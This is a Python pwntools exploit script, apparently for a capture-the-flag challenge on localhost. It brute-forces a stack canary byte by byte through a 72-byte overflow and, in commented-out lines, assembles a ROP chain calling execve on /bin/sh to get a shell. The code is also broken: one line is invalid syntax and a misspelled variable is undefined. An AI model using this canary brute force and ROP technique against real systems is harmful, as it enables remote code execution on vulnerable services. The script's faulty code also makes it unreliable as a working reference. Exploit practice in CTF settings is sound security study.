from pwn import *


canary = p64(0x002f2ee49fb3acdb)
canary_search = False if len(canary) == 8 True
context.log_level = 'error'

def check_payload(payload, b):
    try:
        p = remote('localhost', 4243, timeout=0.1)

        p.recvuntil(b"[BOBBY] You don't know what you've gotten into: ", timeout=0.1)

        p.send(payload+bytes([b]))
        
        responce = p.recvall(timeout=0.1)
        p.close()

        if b"You don't know what you've gotten into" in responce:
            return True
        return False

    except (EOFError, PwnlibException):
        p.close()
        return False
if canary_search:
    base_payload = b'A'*72
    for i in range(0, 8):
        for b in range(0, 256):
            if check_payload(base_payload, b):
                print(f"[+] Process SURVIVED! First byte is: {hex(b)} ({bytes([b])})")
                base_payload = base_payload + bytes([b])
                canary += bytes([b])
                break
print("Our canary is :", canary.hex())
b= b'\x00'*8
# pop_rdi = 0x28a55
# pop_rax = 0x44c70
# syscall = 0x26858
# bin_sh  = 0x1abf05
# # 3. Build Syscall ROP Chain
# rop_chain  = p64(pop_rax) + p64(0x3b)       # sys_execve
# rop_chain += p64(pop_rdi) + p64(bin_sh)     # filename = "/bin/sh"
# # Optionally add pop rsi / pop rdx if gadgets are available to clear them to 0
# rop_chain += p64(syscall)

# # 4. Final Payload Assembly
# payload = b"A" * 72 + canary# + saved_rbp + rop_chain
# p = remote('localhost', 4243)
# p.recvuntil(b"[BOBBY] You don't know what you've gotten into: ")
# p.send(paload)
# p.interactive()